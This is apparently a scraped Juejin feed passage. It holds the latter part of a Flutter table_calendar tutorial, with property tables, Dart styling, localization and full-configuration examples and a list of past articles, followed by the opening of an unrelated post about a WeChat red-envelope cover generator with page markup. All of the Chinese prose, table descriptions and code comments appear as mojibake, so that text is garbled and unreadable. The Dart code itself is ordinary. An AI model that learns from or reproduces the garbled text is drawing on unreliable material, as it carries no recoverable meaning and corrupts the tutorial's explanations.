<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>defaultTextStyle</code></td><td><code>TextStyle</code></td><td>é»˜è®¤æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>selectedTextStyle</code></td><td><code>TextStyle</code></td><td>é€‰ä¸­æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>todayTextStyle</code></td><td><code>TextStyle</code></td><td>ä»Šå¤©æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>weekendTextStyle</code></td><td><code>TextStyle</code></td><td>å‘¨æœ«æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>outsideTextStyle</code></td><td><code>TextStyle</code></td><td>æ˜¾ç¤ºèŒƒå›´å¤–æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>disabledTextStyle</code></td><td><code>TextStyle</code></td><td>ç¦ç”¨æ—¥æœŸæ–‡æœ¬æ ·å¼</td></tr><tr><td><code>selectedDecoration</code></td><td><code>Decoration</code></td><td>é€‰ä¸­æ—¥æœŸè£…é¥°ï¼ˆèƒŒæ™¯ç­‰ï¼‰</td></tr><tr><td><code>todayDecoration</code></td><td><code>Decoration</code></td><td>ä»Šå¤©æ—¥æœŸè£…é¥°</td></tr><tr><td><code>defaultDecoration</code></td><td><code>Decoration</code></td><td>é»˜è®¤æ—¥æœŸè£…é¥°</td></tr><tr><td><code>weekendDecoration</code></td><td><code>Decoration</code></td><td>å‘¨æœ«æ—¥æœŸè£…é¥°</td></tr><tr><td><code>outsideDecoration</code></td><td><code>Decoration</code></td><td>èŒƒå›´å¤–æ—¥æœŸè£…é¥°</td></tr><tr><td><code>disabledDecoration</code></td><td><code>Decoration</code></td><td>ç¦ç”¨æ—¥æœŸè£…é¥°</td></tr><tr><td><code>rangeStartDecoration</code></td><td><code>Decoration</code></td><td>èŒƒå›´é€‰æ‹©èµ·å§‹æ—¥æœŸè£…é¥°</td></tr><tr><td><code>rangeEndDecoration</code></td><td><code>Decoration</code></td><td>èŒƒå›´é€‰æ‹©ç»“æŸæ—¥æœŸè£…é¥°</td></tr><tr><td><code>rangeMiddleDecoration</code></td><td><code>Decoration</code></td><td>èŒƒå›´é€‰æ‹©ä¸­é—´æ—¥æœŸè£…é¥°</td></tr><tr><td><code>markersDecoration</code></td><td><code>Decoration</code></td><td>äº‹ä»¶æ ‡è®°å®¹å™¨è£…é¥°</td></tr><tr><td><code>markersMaxCount</code></td><td><code>int</code></td><td>æœ€å¤šæ˜¾ç¤ºçš„äº‹ä»¶æ ‡è®°æ•°é‡</td></tr><tr><td><code>markerSize</code></td><td><code>double</code></td><td>äº‹ä»¶æ ‡è®°å¤§å°</td></tr><tr><td><code>markersOffset</code></td><td><code>PositionedOffset</code></td><td>äº‹ä»¶æ ‡è®°åç§»é‡</td></tr><tr><td><code>canMarkersOverflow</code></td><td><code>bool</code></td><td>æ ‡è®°æ˜¯å¦å…è®¸æº¢å‡ºæ—¥æœŸå•å…ƒæ ¼</td></tr><tr><td><code>outsideDaysVisible</code></td><td><code>bool</code></td><td>æ˜¯å¦æ˜¾ç¤ºèŒƒå›´å¤–çš„æ—¥æœŸï¼ˆé»˜è®¤trueï¼‰</td></tr></tbody></table>
<h4 data-id="heading-11">HeaderStyle å­å±æ€§</h4>











































































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>formatButtonVisible</code></td><td><code>bool</code></td><td>æ˜¯å¦æ˜¾ç¤ºè§†å›¾åˆ‡æ¢æŒ‰é’®ï¼ˆé»˜è®¤trueï¼‰</td></tr><tr><td><code>formatButtonShowsNext</code></td><td><code>bool</code></td><td>åˆ‡æ¢æŒ‰é’®æ˜¯å¦æ˜¾ç¤ºä¸‹ä¸€ä¸ªæ ¼å¼ï¼ˆé»˜è®¤trueï¼‰</td></tr><tr><td><code>formatButtonDecoration</code></td><td><code>BoxDecoration</code></td><td>è§†å›¾åˆ‡æ¢æŒ‰é’®è£…é¥°</td></tr><tr><td><code>formatButtonTextStyle</code></td><td><code>TextStyle</code></td><td>è§†å›¾åˆ‡æ¢æŒ‰é’®æ–‡æœ¬æ ·å¼</td></tr><tr><td><code>leftChevronIcon</code></td><td><code>Widget</code></td><td>å·¦ç®­å¤´å›¾æ ‡</td></tr><tr><td><code>rightChevronIcon</code></td><td><code>Widget</code></td><td>å³ç®­å¤´å›¾æ ‡</td></tr><tr><td><code>titleTextStyle</code></td><td><code>TextStyle</code></td><td>æ ‡é¢˜ï¼ˆæœˆä»½ï¼‰æ–‡æœ¬æ ·å¼</td></tr><tr><td><code>titleCentered</code></td><td><code>bool</code></td><td>æ ‡é¢˜æ˜¯å¦å±…ä¸­ï¼ˆé»˜è®¤falseï¼‰</td></tr><tr><td><code>titleFormatter</code></td><td><code>String Function(DateTime, dynamic)</code></td><td>æ ‡é¢˜æ–‡æœ¬æ ¼å¼åŒ–å™¨</td></tr><tr><td><code>headerPadding</code></td><td><code>EdgeInsets</code></td><td>è¡¨å¤´å†…è¾¹è·</td></tr><tr><td><code>headerMargin</code></td><td><code>EdgeInsets</code></td><td>è¡¨å¤´å¤–è¾¹è·</td></tr><tr><td><code>chevronPadding</code></td><td><code>EdgeInsets</code></td><td>ç®­å¤´å›¾æ ‡å†…è¾¹è·</td></tr><tr><td><code>chevronVisible</code></td><td><code>bool</code></td><td>æ˜¯å¦æ˜¾ç¤ºç®­å¤´å›¾æ ‡ï¼ˆé»˜è®¤trueï¼‰</td></tr></tbody></table>
<p>æ ·å¼å®šåˆ¶ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">TableCalendar(
  <span class="hljs-comment">// ...å…¶ä»–å‚æ•°</span>
  calendarStyle: CalendarStyle(
    <span class="hljs-comment">// é€‰ä¸­æ—¥æœŸæ ·å¼</span>
    selectedDecoration: BoxDecoration(
      color: Colors.blue,
      shape: BoxShape.circle,
    ),
    <span class="hljs-comment">// ä»Šå¤©æ—¥æœŸæ ·å¼</span>
    todayDecoration: BoxDecoration(
      color: Colors.grey[<span class="hljs-number">200</span>],
      shape: BoxShape.circle,
    ),
    <span class="hljs-comment">// å‘¨æœ«æ ·å¼</span>
    weekendTextStyle: TextStyle(color: Colors.red),
    <span class="hljs-comment">// äº‹ä»¶æ ‡è®°æ ·å¼</span>
    markersMaxCount: <span class="hljs-number">3</span>,  <span class="hljs-comment">// æœ€å¤šæ˜¾ç¤º3ä¸ªæ ‡è®°</span>
    markerSize: <span class="hljs-number">6</span>,
  ),
  <span class="hljs-comment">// è¡¨å¤´æ ·å¼</span>
  headerStyle: HeaderStyle(
    formatButtonVisible: <span class="hljs-keyword">false</span>,  <span class="hljs-comment">// éšè—è§†å›¾åˆ‡æ¢æŒ‰é’®</span>
    titleCentered: <span class="hljs-keyword">true</span>,
    headerPadding: EdgeInsets.symmetric(vertical: <span class="hljs-number">8</span>),
    titleTextStyle: TextStyle(fontSize: <span class="hljs-number">18</span>, fontWeight: FontWeight.bold),
  ),
)
</code></pre>
<h3 data-id="heading-12">3.6. æœ¬åœ°åŒ–å±æ€§</h3>






























<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>locale</code></td><td><code>String?</code></td><td>æœ¬åœ°åŒ–è¯­è¨€ä»£ç ï¼ˆå¦‚'zh_CN'ã€'en_US'ï¼‰</td></tr><tr><td><code>daysOfWeekLabels</code></td><td><code>List&lt;String&gt;</code></td><td>æ˜ŸæœŸæ ‡ç­¾æ–‡æœ¬ï¼ˆé»˜è®¤æŒ‰localeç”Ÿæˆï¼‰</td></tr><tr><td><code>daysOfWeekLabelsExceptions</code></td><td><code>Map&lt;int, String&gt;</code></td><td>ç‰¹å®šæ˜ŸæœŸå‡ çš„æ–‡æœ¬è¦†ç›–</td></tr><tr><td><code>weekNumberLabel</code></td><td><code>String</code></td><td>å‘¨æ•°æ ‡ç­¾æ–‡æœ¬ï¼ˆé»˜è®¤'W'ï¼‰</td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:intl/intl.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:intl/date_symbol_data_local.dart'</span>;

<span class="hljs-comment">// åˆå§‹åŒ–æœ¬åœ°åŒ–</span>
initializeDateFormatting().then((_) {
  setState(() {});
});

TableCalendar(
  <span class="hljs-comment">// ...å…¶ä»–å‚æ•°</span>
  locale: <span class="hljs-string">'zh_CN'</span>,  <span class="hljs-comment">// æ”¯æŒ 'en_US', 'ja_JP' ç­‰</span>
  daysOfWeekStyle: DaysOfWeekStyle(
    weekdayStyle: TextStyle(),
    weekendStyle: TextStyle(color: Colors.red),
  ),
)
</code></pre>
<h3 data-id="heading-13">3.7. äº¤äº’æ§åˆ¶å±æ€§</h3>



































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>enabledDayPredicate</code></td><td><code>bool Function(DateTime)</code></td><td>åˆ¤æ–­æ—¥æœŸæ˜¯å¦å¯äº¤äº’ï¼ˆé»˜è®¤å…¨éƒ¨å¯äº¤äº’ï¼‰</td></tr><tr><td><code>onHeaderTapped</code></td><td><code>void Function(DateTime)</code></td><td>è¡¨å¤´ç‚¹å‡»å›è°ƒ</td></tr><tr><td><code>onHeaderLongPressed</code></td><td><code>void Function(DateTime)</code></td><td>è¡¨å¤´é•¿æŒ‰å›è°ƒ</td></tr><tr><td><code>onDayLongPressed</code></td><td><code>void Function(DateTime, DateTime)</code></td><td>æ—¥æœŸé•¿æŒ‰å›è°ƒ</td></tr><tr><td><code>dragStartBehavior</code></td><td><code>DragStartBehavior</code></td><td>æ‹–æ‹½èµ·å§‹è¡Œä¸ºï¼ˆé»˜è®¤startï¼‰</td></tr></tbody></table>
<h3 data-id="heading-14">3.8. é«˜çº§è‡ªå®šä¹‰å±æ€§</h3>













































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>calendarBuilders</code></td><td><code>CalendarBuilders</code></td><td>è‡ªå®šä¹‰æ„å»ºå™¨é›†åˆï¼ˆä»¥ä¸‹ä¸ºå¸¸ç”¨å­é¡¹ï¼‰</td></tr><tr><td>- <code>dayBuilder</code></td><td><code>Widget Function(BuildContext, DateTime, DateTime, bool, bool, bool, bool, List)</code></td><td>è‡ªå®šä¹‰æ—¥æœŸå•å…ƒæ ¼</td></tr><tr><td>- <code>markerBuilder</code></td><td><code>Widget Function(BuildContext, DateTime, List)</code></td><td>è‡ªå®šä¹‰äº‹ä»¶æ ‡è®°</td></tr><tr><td>- <code>headerTitleBuilder</code></td><td><code>Widget Function(BuildContext, DateTime)</code></td><td>è‡ªå®šä¹‰è¡¨å¤´æ ‡é¢˜</td></tr><tr><td>- <code>weekNumberBuilder</code></td><td><code>Widget Function(BuildContext, int)</code></td><td>è‡ªå®šä¹‰å‘¨æ•°æ˜¾ç¤º</td></tr><tr><td><code>transitionDuration</code></td><td><code>Duration</code></td><td>è§†å›¾åˆ‡æ¢åŠ¨ç”»æ—¶é•¿ï¼ˆé»˜è®¤200msï¼‰</td></tr><tr><td><code>pageAnimationEnabled</code></td><td><code>bool</code></td><td>æ˜¯å¦å¯ç”¨é¡µé¢åˆ‡æ¢åŠ¨ç”»ï¼ˆé»˜è®¤trueï¼‰</td></tr></tbody></table>
<h2 data-id="heading-15">4. æ€§èƒ½ä¼˜åŒ–</h2>
<ul>
<li>ä½¿ç”¨ <code>ValueNotifier</code> ç®¡ç†äº‹ä»¶æ•°æ®ï¼Œé¿å…ä¸å¿…è¦é‡å»º</li>
<li>å¤æ‚æ ‡è®°ä½¿ç”¨ç¼“å­˜Widget</li>
<li>åˆç†è®¾ç½® <code>firstDay</code> å’Œ <code>lastDay</code> èŒƒå›´</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">final</span> ValueNotifier&lt;<span class="hljs-built_in">List</span>&gt; _selectedEvents = ValueNotifier([]);

<span class="hljs-comment">// ç›‘å¬é€‰ä¸­æ—¥æœŸå˜åŒ–æ›´æ–°äº‹ä»¶</span>
<span class="hljs-keyword">void</span> _updateSelectedEvents() {
  _selectedEvents.value = _events[_selectedDay] ?? [];
}

<span class="hljs-comment">// æ„å»ºæ—¶ä½¿ç”¨ValueListenableBuilder</span>
ValueListenableBuilder&lt;<span class="hljs-built_in">List</span>&gt;(
  valueListenable: _selectedEvents,
  builder: (context, value, _) {
    <span class="hljs-keyword">return</span> <span class="hljs-comment">// äº‹ä»¶åˆ—è¡¨</span>
  },
)
</code></pre>
<h2 data-id="heading-16">5. å®Œæ•´é…ç½®ç¤ºä¾‹</h2>
<pre><code class="hljs language-dart" lang="dart">TableCalendar(
  firstDay: <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2020</span>),
  lastDay: <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2030</span>),
  focusedDay: _focusedDay,
  selectedDayPredicate: (day) =&gt; isSameDay(_selectedDay, day),
  onDaySelected: (selectedDay, focusedDay) {
    <span class="hljs-keyword">if</span> (!isSameDay(_selectedDay, selectedDay)) {
      setState(() {
        _selectedDay = selectedDay;
        _focusedDay = focusedDay;
      });
    }
  },
  <span class="hljs-comment">// è§†å›¾é…ç½®</span>
  calendarFormat: _calendarFormat,
  onFormatChanged: (format) =&gt; setState(() =&gt; _calendarFormat = format),
  availableCalendarFormats: <span class="hljs-keyword">const</span> {
    CalendarFormat.month: <span class="hljs-string">'æœˆ'</span>,
    CalendarFormat.week: <span class="hljs-string">'å‘¨'</span>,
  },
  <span class="hljs-comment">// èŒƒå›´é€‰æ‹©</span>
  rangeStartDay: _rangeStart,
  rangeEndDay: _rangeEnd,
  rangeSelectionMode: _rangeSelectionMode,
  onRangeSelected: (start, end, focusedDay) =&gt; setState(() {
    _rangeStart = start;
    _rangeEnd = end;
    _rangeSelectionMode = RangeSelectionMode.toggledOn;
  }),
  <span class="hljs-comment">// äº‹ä»¶åŠ è½½</span>
  eventLoader: (day) =&gt; _events[day] ?? [],
  <span class="hljs-comment">// æ ·å¼å®šåˆ¶</span>
  calendarStyle: CalendarStyle(
    selectedDecoration: <span class="hljs-keyword">const</span> BoxDecoration(
      color: Colors.blue,
      shape: BoxShape.circle,
    ),
    todayDecoration: BoxDecoration(
      color: Colors.grey[<span class="hljs-number">200</span>],
      shape: BoxShape.circle,
    ),
    markersMaxCount: <span class="hljs-number">3</span>,
  ),
  headerStyle: <span class="hljs-keyword">const</span> HeaderStyle(
    titleCentered: <span class="hljs-keyword">true</span>,
    formatButtonVisible: <span class="hljs-keyword">false</span>,
  ),
  <span class="hljs-comment">// æœ¬åœ°åŒ–</span>
  locale: <span class="hljs-string">'zh_CN'</span>,
  <span class="hljs-comment">// è‡ªå®šä¹‰æ„å»ºå™¨</span>
  calendarBuilders: CalendarBuilders(
    markerBuilder: (context, date, events) =&gt; events.isNotEmpty
        ? Container(
            width: <span class="hljs-number">12</span>,
            height: <span class="hljs-number">12</span>,
            decoration: <span class="hljs-keyword">const</span> BoxDecoration(
              color: Colors.red,
              shape: BoxShape.circle,
            ),
          )
        : <span class="hljs-keyword">null</span>,
  ),
)
</code></pre>
<h2 data-id="heading-17">6. æ€»ç»“</h2>
<p><code>table_calendar</code> æä¾›äº†çµæ´»çš„æ—¥å†è§£å†³æ–¹æ¡ˆï¼Œæ ¸å¿ƒå…³æ³¨ï¼š</p>
<ul>
<li>åŸºç¡€æ—¥æœŸé€‰æ‹©ä¸èŒƒå›´é€‰æ‹©çš„çŠ¶æ€ç®¡ç†</li>
<li>äº‹ä»¶æ ‡è®°ä¸è‡ªå®šä¹‰æ ·å¼çš„è§†è§‰å®šåˆ¶</li>
<li>è§†å›¾åˆ‡æ¢ä¸æœ¬åœ°åŒ–çš„ç”¨æˆ·ä½“éªŒä¼˜åŒ–</li>
<li>æ€§èƒ½ä¼˜åŒ–æŠ€å·§ï¼ˆå¦‚çŠ¶æ€éš”ç¦»ã€åˆç†è®¾ç½®èŒƒå›´ï¼‰</li>
</ul>
<p>æ›´å¤æ‚åŠŸèƒ½å¯å‚è€ƒ<a href="https://link.juejin.cn?target=https%3A%2F%2Fpub.dev%2Fpackages%2Ftable_calendar" target="_blank" title="https://pub.dev/packages/table_calendar" ref="nofollow noopener noreferrer">å®˜æ–¹æ–‡æ¡£</a>æˆ–<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Faleksanderwozniak%2Ftable_calendar" target="_blank" title="https://github.com/aleksanderwozniak/table_calendar" ref="nofollow noopener noreferrer">Githubä»“åº“</a>å®ç°ã€‚ä½¿ç”¨æ—¶éœ€æ³¨æ„èŒƒå›´é€‰æ‹©ä¸å•ä¸ªé€‰æ‹©çš„äº’æ–¥æ€§ï¼Œä»¥åŠæœ¬åœ°åŒ–é…ç½®çš„åˆå§‹åŒ–æ­¥éª¤ã€‚</p>
<hr/>
<blockquote>
<p>æœ¬æ¬¡åˆ†äº«å°±åˆ°è¿™å„¿å•¦ï¼Œæˆ‘æ˜¯é¹å¤šå¤šï¼Œæ·±è€•å‰ç«¯çš„æŠ€æœ¯åˆ›ä½œè€…ï¼Œå¦‚æœæ‚¨çœ‹äº†è§‰å¾—æœ‰å¸®åŠ©ï¼Œæ¬¢è¿è¯„è®ºï¼Œå…³æ³¨ï¼Œç‚¹èµï¼Œè½¬å‘ï¼Œæˆ‘ä»¬ä¸‹æ¬¡è§~</p>
</blockquote>
<p>PSï¼šåœ¨æœ¬é¡µæŒ‰F12ï¼Œåœ¨consoleä¸­è¾“å…¥document.getElementsByClassName('panel-btn')[0].click();æœ‰æƒŠå–œå“¦~</p>
<p><code>å¾€æœŸæ–‡ç« </code></p>
<ul>
<li><a href="https://juejin.cn/post/7580389111921786943" target="_blank" title="https://juejin.cn/post/7580389111921786943">flutter-å±å¹•è‡ªé€‚åº”æ’ä»¶flutter_screenutilæ•™ç¨‹å…¨æŒ‡å—</a></li>
<li><a href="https://juejin.cn/post/7579101504289882166" target="_blank" title="https://juejin.cn/post/7579101504289882166">flutter-ä½¿ç”¨url_launcheræ‰“å¼€é“¾æ¥/åº”ç”¨/çŸ­ä¿¡/é‚®ä»¶å’Œè¯„åˆ†è·³è½¬ç­‰</a></li>
<li><a href="https://juejin.cn/post/7570923924365230143" target="_blank" title="https://juejin.cn/post/7570923924365230143">flutterå›¾ç‰‡é€‰æ‹©åº“multi_image_picker_pluså’Œimage_pickerçš„å¯¹æ¯”å’Œä½¿ç”¨è§£æ</a></li>
<li><a href="https://juejin.cn/post/7568136081302978623" target="_blank" title="https://juejin.cn/post/7568136081302978623">è§£é”flutterå¼¹çª—æ–°å§¿åŠ¿ï¼šdialog-flutter_smart_dialogæ’ä»¶è§£è¯»+æ¡ˆä¾‹</a></li>
<li><a href="https://juejin.cn/post/7559089440901545999" target="_blank" title="https://juejin.cn/post/7559089440901545999">flutter-åˆ‡æ¢çŠ¶æ€æ˜¾ç¤ºä¸åŒç»„ä»¶10ç§å®ç°æ–¹æ¡ˆå…¨è§£æ</a></li>
<li><a href="https://juejin.cn/post/7555079970491318308" target="_blank" title="https://juejin.cn/post/7555079970491318308">flutter-è¯¦è§£æ§åˆ¶ç»„ä»¶æ˜¾ç¤ºçš„ä¸¤ç§æ–¹å¼Offstageä¸Visibility</a></li>
<li><a href="https://juejin.cn/post/7535358416182788122" target="_blank" title="https://juejin.cn/post/7535358416182788122">flutter-ä½¿ç”¨AnimatedDefaultTextStyleå®ç°æ–‡æœ¬åŠ¨ç”»</a></li>
<li><a href="https://juejin.cn/post/7537339432291434496" target="_blank" title="https://juejin.cn/post/7537339432291434496">flutter-ä½¿ç”¨SafeAreaç»„ä»¶å¤„ç†å„æœºå‹çš„å®‰å…¨è·ç¦»</a></li>
<li><a href="https://juejin.cn/spost/7537593417099149321" target="_blank" title="https://juejin.cn/spost/7537593417099149321">flutter-å®ç°æ¸å˜è‰²è¾¹æ¡†èƒŒæ™¯ä»¥åŠæ¸å˜è‰²æ–‡å­—</a></li>
<li><a href="https://juejin.cn/post/7543474419240370185" target="_blank" title="https://juejin.cn/post/7543474419240370185">flutter-ä½¿ç”¨confettiåˆ¶ä½œç‚«é…·çº¸å±‘çˆ†ç‚¸ç²’å­åŠ¨ç”»</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¾®ä¿¡çº¢åŒ…å°é¢åˆ¶ä½œredbag-cover]]></title>    <link>https://juejin.cn/post/7581728606308073524</link>    <guid>https://juejin.cn/post/7581728606308073524</guid>    <pubDate>2025-12-10T00:56:07.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581728606308073524" data-draft-id="7581750252999868451" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¾®ä¿¡çº¢åŒ…å°é¢åˆ¶ä½œredbag-cover"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-10T00:56:07.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä»£ç æ¬¡ä½é¢"/> <meta itemprop="url" content="https://juejin.cn/user/1535333867720295"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¾®ä¿¡çº¢åŒ…å°é¢åˆ¶ä½œredbag-cover
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1535333867720295/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä»£ç æ¬¡ä½é¢
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:56:07.000Z" title="Wed Dec 10 2025 00:56:07 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å»å¹´æ˜¥èŠ‚ï¼Œæˆ‘æ³¨æ„åˆ°å¾®ä¿¡çº¢åŒ…å°é¢æœç´¢é‡æš´å¢ï¼Œå´é²œæœ‰ä¾¿æ·çš„ç”Ÿæˆå·¥å…·ã€‚äºæ˜¯æˆ‘å†³å®šåšä¸€ä¸ªçº¢åŒ…å°é¢ç”Ÿæˆç½‘ç«™ã€‚
å€ŸåŠ©AIå¼ºå¤§å¼€å‘èƒ½åŠ›ï¼Œ ä»…ç”¨ä¸€å‘¨æ—¶é—´ã€‚å®Œæˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.redbagcover.com" target="_blank" title="https://www.redbagcover.com" ref="nofollow noopener noreferrer">www.redbagcover.com</a></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc6ff12f7de049e9b85749975b6604f2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Luj56CB5qyh5L2N6Z2i:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765932967&amp;x-signature=lDyKUN8%2FQ%2BplSiLqdGbI94HZloY%3D" alt="image.png" loading="lazy"/>
äº§å“æ ¸å¿ƒåŠŸèƒ½ï¼šä¸€ä¸ª<strong>å…è®¸ç”¨æˆ·é€šè¿‡ç®€å•æç¤ºè¯å¿«é€Ÿç”Ÿæˆç¬¦åˆå¾®ä¿¡å®˜æ–¹è¦æ±‚çš„çº¢åŒ…å°é¢çš„å·¥å…·</strong>
